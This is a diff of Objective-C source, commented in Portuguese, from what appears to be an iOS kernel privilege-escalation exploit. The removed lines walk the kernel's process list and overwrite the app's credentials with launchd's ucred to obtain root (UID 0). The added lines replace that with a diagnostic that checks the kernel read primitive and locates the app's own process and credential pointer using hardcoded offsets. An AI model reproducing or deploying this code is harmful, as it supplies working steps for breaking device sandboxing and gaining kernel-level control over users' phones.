@@ -72,39 +72,56 @@ extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_siz
 #pragma mark - Exploração Principal
 
 - (BOOL)escalateToRoot {
-    [self logToWeb:@"🚀 Iniciando Exploit Real (A13)..."];
+    [self logToWeb:@"🔍 Iniciando Diagnóstico de Memória..."];
     
     _kernelSlide = [self getKernelSlideReal];
     _kernelBase = 0xFFFFFFF007004000ULL + _kernelSlide;
+    
+    // Teste 1: Leitura do Header
+    uint32_t magic = [self kread32:_kernelBase];
+    [self logToWeb:[NSString stringWithFormat:@"DEBUG: Magic lido: 0x%x (Esperado: 0xfeedfacf)", magic]];
 
-    if ([self kread32:_kernelBase] != 0xfeedfacf) {
-        [self logToWeb:@"❌ Falha: Kread não funcional."];
+    if (magic != 0xfeedfacf) {
+        [self logToWeb:@"❌ ERRO: Primitiva kread bloqueada pelo Sandbox ou corrigida."];
         return NO;
     }
 
-    uint64_t launchd_proc = 0, my_proc = 0;
+    // Teste 2: Buscar meu próprio processo na lista
+    pid_t meuPid = getpid();
+    [self logToWeb:[NSString stringWithFormat:@"DEBUG: Meu PID: %d", meuPid]];
+    
     uint64_t allproc_ptr = [self findSymbolAllProcDynamic];
-    uint64_t curr = [self kread64:allproc_ptr];
-    pid_t myPid = getpid();
-
-    for(int i=0; i<500 && curr != 0; i++) {
-        uint32_t pid = [self kread32:(curr + 0x68)];
-        if (pid == 1) launchd_proc = curr;
-        if (pid == myPid) my_proc = curr;
-        curr = [self kread64:curr];
+    if (allproc_ptr == 0) {
+        [self logToWeb:@"❌ ERRO: Não foi possível localizar a lista de processos (allproc)."];
+        return NO;
     }
 
-    if (launchd_proc && my_proc) {
-        uint64_t root_ucred = [self kread64:(launchd_proc + 0xD8)];
-        [self phys_write64:(my_proc + 0xD8) value:root_ucred];
+    uint64_t curr_proc = [self kread64:allproc_ptr];
+    BOOL encontrei = NO;
+
+    // Varre até 1000 processos para encontrar o seu
+    for (int i = 0; i < 1000 && curr_proc != 0; i++) {
+        uint32_t pid_lido = [self kread32:(curr_proc + 0x68)]; // Offset PID estável
         
-        if (getuid() == 0) {
-            [self logToWeb:@"✅ SUCESSO: UID 0!"];
-            return YES;
+        if (pid_lido == meuPid) {
+            [self logToWeb:[NSString stringWithFormat:@"🎯 SUCESSO: Encontrei meu processo em 0x%llx", curr_proc]];
+            encontrei = YES;
+            
+            // Teste 3: Tentar ler o ucred (Credenciais)
+            uint64_t ucred = [self kread64:(curr_proc + 0xD8)];
+            [self logToWeb:[NSString stringWithFormat:@"DEBUG: Meu ucred está em: 0x%llx", ucred]];
+            break;
         }
+        curr_proc = [self kread64:curr_proc]; // Próximo processo (list_next)
     }
-    return NO;
+
+    if (!encontrei) {
+        [self logToWeb:@"❌ ERRO: Percorri a lista mas não encontrei meu PID. Offsets podem estar errados."];
+    }
+
+    return encontrei;
 }
+
 
 #pragma mark - Helpers
 
